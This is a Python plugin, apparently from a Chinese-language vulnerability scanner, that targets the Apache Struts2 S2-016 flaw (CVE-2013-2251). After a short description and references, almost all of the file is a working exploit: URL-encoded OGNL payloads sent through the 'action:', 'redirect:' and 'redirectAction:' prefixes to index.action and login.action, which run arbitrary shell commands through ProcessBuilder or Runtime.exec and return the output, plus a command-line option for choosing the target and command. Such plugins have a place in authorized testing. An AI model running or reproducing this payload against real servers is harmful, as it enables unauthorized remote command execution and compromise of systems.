# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "struts2 命令执行",
        "description": "在struts2中，DefaultActionMapper类支持以\"action:\"、“redirect:\"redirectAction:\"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。",
        "references": [
            "http://struts.apache.org/release/2.3.x/docs/s2-016.html",
            "https://cwiki.apache.org/confluence/display/WW/S2-016",
            "https://nvd.nist.gov/vuln/detail/CVE-2013-2251"
        ],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(7)
        res = self.exec_cmd(self.target.value, f'echo {random_str}')
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.url}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        for param in [
            "redirect", "action", "redirectAction"
        ]:
            for path in [
                "./index.action?" + param + f":${{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{{'sh','-c','{cmd}'}})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}}",
                "./login.action?" + param + f":${{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{{'sh','-c','{cmd}'}})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}}",
                "./index.action?" + param + f"%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20{cmd}%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D"
            ]:
                r = self.request(
                    method='GET',
                    url=urllib.parse.urljoin(url, path),
                    timeout=15,
                )
                if r.status_code == 200 or r.status_code == 400:
                    return r.text



